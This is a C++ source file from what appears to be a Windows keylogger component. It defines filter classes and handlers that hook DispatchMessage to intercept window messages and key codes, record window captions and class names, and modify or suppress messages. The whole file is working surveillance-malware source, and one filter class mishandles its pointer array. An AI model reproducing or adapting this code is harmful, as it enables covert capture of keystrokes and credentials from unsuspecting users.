#include "core\keylogger.h"
#include "core\hook.h"
#include "core\util.h"
#include "core\debug.h"

namespace KeyLogger
{

FilterMsgBase::FilterMsgBase()
{
}

FilterMsgBase::~FilterMsgBase()
{
}

bool FilterMsgBase::Check( FilterMsgParams& params )
{
	return false;
}


FilterMsg::FilterMsg( const uint* _msgs, uint _c_msgs)
{
	msgs = (uint*)Mem::Duplication( _msgs, _c_msgs * sizeof(uint) );
	c_msgs = _c_msgs;
}
		
FilterMsg::~FilterMsg()
{
	Mem::Free(msgs);
}

bool FilterMsg::Check( FilterMsgParams& params )
{
	for( int i = 0; i < c_msgs; i++ )
		if( msgs[i] == params.msg )
			return true;
	return false;
}

FilterKey::FilterKey( const uint* msgs, uint c_msgs, uint* _keys, int _c_keys ) : FilterMsg( msgs, c_msgs )
{
	keys = (uint*)Mem::Duplication( _keys, _c_keys * sizeof(uint) );
	c_keys = _c_keys;
}

FilterKey::~FilterKey()
{
	Mem::Free(keys);
}

bool FilterKey::Check( FilterMsgParams& params )
{
	if( FilterMsg::Check(params) )
		for( int i = 0; i < c_keys; i++ )
			if( keys[i] == (uint)params.wparam )
				return true;
	return false;
}

FilterMsgAnd::FilterMsgAnd( const FilterMsgBase* _filters, int _c_filters )
{
	filters = (FilterMsgBase*)Mem::Duplication( _filters, _c_filters * sizeof(FilterMsgBase*) );
	c_filters = _c_filters;
}

FilterMsgAnd::~FilterMsgAnd()
{
	Mem::Free(filters);
}

bool FilterMsgAnd::Check( FilterMsgParams& params )
{
	for( int i = 0; i < c_filters; i++ )
		if( !filters[i].Check(params) )
			return false;
	return true;
}

FilterMsgOr::FilterMsgOr( const FilterMsgBase** _filters, int _c_filters )
{
	filters = (FilterMsgBase**)Mem::Duplication( _filters, _c_filters * sizeof(FilterMsgBase*) );
	c_filters = _c_filters;
}

FilterMsgOr::~FilterMsgOr()
{
	Mem::Free(filters);
}

bool FilterMsgOr::Check( FilterMsgParams& params )
{
	for( int i = 0; i < c_filters; i++ )
	{
		if( filters[i]->Check(params) )
			return true;
	}
	return false;
}

void ExecForFilterMsg::Exec( FilterMsgParams& params )
{
}

void ExecForFilterMsg::ExecCondition( FilterMsgParams& params )
{
	if( filter->Check(params) )
		Exec(params);
}

static void DispatchMessageParamsToFilter( Hook::ParamsDispatchMessage& from, FilterMsgParams& to )
{
	to.hwnd = from.lpmsg->hwnd;
	to.infoWnd = 0;
	to.msg = from.lpmsg->message;
	to.lparam = from.lpmsg->lParam;
	to.wparam = from.lpmsg->wParam;
	to.ansi = from._ansi;
	to.pt = &from.lpmsg->pt;
	to._ret = from._ret;
}

static void FilterToDispatchMessageParams( FilterMsgParams& from, Hook::ParamsDispatchMessage& to )
{
	to.lpmsg->hwnd = from.hwnd;
	to.lpmsg->message = from.msg;
	to.lpmsg->lParam = from.lparam;
	to.lpmsg->wParam = from.wparam;
	to._ret = from._ret;
}


//обработчик хука функции DispatchMessage
static bool FilterDispatchMessage( Hook::ParamsDispatchMessage& params )
{
	FilterMsgParams params2;
	params2._stop = false;
	params2._update = false;
	params2.infoWnd = 0;
	DispatchMessageParamsToFilter( params, params2 );
	ExecForFilterMsg* filter = (ExecForFilterMsg*)params.tag;
	filter->ExecCondition(params2);
	if( params2._update ) 
		FilterToDispatchMessageParams( params2, params );
	return params2._stop;
}

//обработчик хука функции DispatchMessage, дополнительно еще заполняется информация об окне
static bool FilterDispatchMessageWnd( Hook::ParamsDispatchMessage& params )
{
	FilterMsgParams params2;
	params2._stop = false;
	params2._update = false;
	DispatchMessageParamsToFilter( params, params2 );
	InfoWnd iw;
	Window::GetCaption( params2.hwnd, iw.caption );
	Window::GetNameClass( params2.hwnd, iw.nameClass );
	iw.hashCaption = iw.caption.Hash();
	iw.hashNameClass = iw.nameClass.Hash();
	params2.infoWnd = &iw;
	ExecForFilterMsg* filter = (ExecForFilterMsg*)params.tag;
	filter->ExecCondition(params2);
	if( params2._update ) 
		FilterToDispatchMessageParams( params2, params );
	return params2._stop;
}


bool JoinDispatchMessage( ExecForFilterMsg* filter, bool before )
{
	return Hook::Join_DispatchMessage( FilterDispatchMessage, filter, before );
}

bool JoinDispatchMessageWnd( ExecForFilterMsg* filter, bool before  )
{
	return Hook::Join_DispatchMessage( FilterDispatchMessageWnd, filter, before );
}

}
